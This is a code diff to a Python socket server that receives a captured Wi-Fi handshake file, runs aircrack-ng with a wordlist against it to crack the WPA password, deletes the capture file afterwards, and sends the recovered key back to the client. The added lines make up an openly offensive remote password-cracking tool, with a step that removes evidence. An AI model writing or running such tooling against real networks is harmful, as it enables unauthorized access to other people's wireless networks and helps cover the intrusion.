@@ -1,5 +1,27 @@
 import socket
 import os
+import subprocess
+
+
+def bToString(arg):
+    return ''.join(map(chr, arg))
+
+
+def breakKey():
+    cracking = subprocess.run(
+        ['.\\aircrack-ng-1.6-win\\bin\\aircrack-ng.exe', "-l", "password", "-w", "wordlist.txt", "handshake-01.cap"],
+        shell=True, stdout=subprocess.PIPE)
+    cracking.stdout = bToString(cracking.stdout)
+    if cracking.stdout.__contains__("KEY FOUND"):
+        key = open("password").readline()
+        print("Key found:", key)
+        # delete .cap file
+        subprocess.run(["del", "handshake-01.cap"], shell=True)
+        # send key back
+        return key
+    else:
+        return None
+
 
 HOST = "0.0.0.0"  # Standard loopback interface address (localhost)
 PORT = 1234  # Port to listen on (non-privileged ports are > 1023)
@@ -7,7 +29,7 @@ BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
 
 s = socket.socket()
-s.bind((HOST,PORT))
+s.bind((HOST, PORT))
 s.listen(5)
 print(f"[*] Listening as {HOST}:{PORT}")
 
@@ -27,8 +49,15 @@ with open(filename, "wb") as f:
             break
         # write to the file the bytes we just received
         f.write(bytes_read)
+    print("File received")
+    pass
 
-# close the client socket
-client_socket.close()
+key = breakKey()
+if key is None:
+    print("No key extracted")
+else:
+    client_socket.sendall(bytes(key, 'utf-8'))
+    client_socket.close()
+
 # close the server socket
 s.close()
